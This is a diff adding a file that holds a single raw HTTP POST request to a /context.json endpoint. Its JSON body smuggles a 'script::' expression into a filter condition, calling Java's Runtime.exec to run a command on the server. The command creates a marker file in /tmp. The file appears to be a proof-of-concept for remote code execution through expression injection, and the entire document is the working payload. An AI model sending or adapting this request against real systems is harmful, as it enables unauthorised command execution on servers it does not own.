@@ -1,0 +1,28 @@
+POST /context.json HTTP/1.1
+Host: 10.10.3.128
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+Connection: close
+Content-Type: application/json
+Content-Length: 487
+
+{
+    "filters": [
+        {
+            "id": "sample",
+            "filters": [
+                {
+                    "condition": {
+                         "parameterValues": {
+                            "": "script::Runtime r = Runtime.getRuntime(); r.exec(\"touch /tmp/mvel\");"
+                        },
+                        "type": "profilePropertyCondition"
+                    }
+                }
+            ]
+        }
+    ],
+    "sessionId": "sample"
+}
